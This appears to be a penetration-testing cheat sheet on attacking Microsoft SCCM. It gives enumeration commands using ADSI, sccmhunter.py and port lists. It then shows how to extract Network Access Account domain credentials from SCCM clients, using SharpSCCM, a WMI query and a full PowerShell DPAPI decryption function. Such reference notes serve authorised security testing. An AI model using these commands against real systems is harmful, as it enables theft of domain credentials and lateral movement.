# SCCM
 - SharpSCCM: https://github.com/Mayyhem/SharpSCCM    

## Enumeration
On a SCCM managed endpoint, you can find the Configuration Manager client in the Control Panel, where you can find the configuration (e.g. Site Server and Site Name).
If you do not have access to such a managed client, there are other ways:   
- Using PowerShell ADSI: ([adsisearcher]"(objectClass=mSSMSManagementPoint)").FindAll().properties
- Using sccmhunter.py ( ) : python3 sccmhunter.py find -u username -p 'pass' -d domain.local -dc-ip dc1.domain.local 
- List SCCM accounts using sccmhunter.py: python3 sccmhunter.py show -users
- List SCCM computers using sccmhunter.py: python3 sccmhunter.py show -computers

Identifying SCCM servers from portscans (Nmap):    
- 8530, 8531, 10123 (Site Server, Management Point)
- 49152-49159 (Distribution Point)
- UDP 4011 (Operating System Deployment)
 
 ## Network Access Account
 Active Directory domain accounts used by systems that are not joined to AD.   
 SCCM deploys a so called "Network Access Account" to the workstations, which is used to access network shares. Pushed to every SCCM client in machine policy   
 Credentials are stored locally on clients as DPAPI blobs protected by the system's masterkey   
 - Retrievable via WMI as a privileged user
 - Remain in CIM repository (C:\Windows\System32\Wbem\Repository\OBJECTS.DATA) **after client is uninstalled or account rotation**

### NAA Creds
Retrieve and decrypt Network Access Account domain credentials from an SCCM client:   
`SharpSCCM.exe local naa wmi`   
WMI Query:   
`select * from CCM_NetworkAccessAccount`   

**Decrypt Credentials**   
The credentials can be extracted over DPAPI calls with the NT/SYSTEM user.   

```
# Source: https://github.com/rzander/sccmclictrlib/blob/46640553235664bf2da45dc7f6e1f09628a497b0/sccmclictr.automation/Properties/Resources.resx
function UnProtect-PolicySecret {
<#
    .SYNOPSIS
    Decrypts policy secrets (c) 2016 by Mattias Benninge
 
    .DESCRIPTION
    The UnProtect-PolicySecret CmdLet takes a encrypted string and returnsthe decrypted sting.
     
    .NOTES
    This function must be run under the local system account on the computer that encrypted the data.
   
    .EXAMPLE
    UnProtect-PolicySecret -data "F600000001000000D08C9DDF0115D1118C7A00C04FC297EB010000006AF233F693"
 
    .PARAMETER Data
    [String] Encrypted data
#>
 
    [CmdletBinding()]
    PARAM (
        [Parameter(Position=0,Mandatory=$true,HelpMessage="Encrypted sting",ValueFromPipeline=$true)][Alias("Data")][String] $strData
    )
                              
    # Chop string up into bytes, and drop the first 4 bytes
    [System.Byte[]]$byteData = New-Object System.Byte[] $($strData.length / 2 - 4)
    for ($i = 0; $i -lt (($strData.length / 2) - 4); $i++)
    {
        $byteData[$i] = [System.Convert]::ToByte($strData.substring(($i + 4) * 2, 2),16)
    }
 
    #Add the security type assembly
    Add-Type -AssemblyName System.Security
             
    #Decrypt the data
    $bytePlainText = [System.Security.Cryptography.ProtectedData]::Unprotect($byteData , $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
    return $([System.Text.UnicodeEncoding]::Unicode.GetString($bytePlainText))
}
```
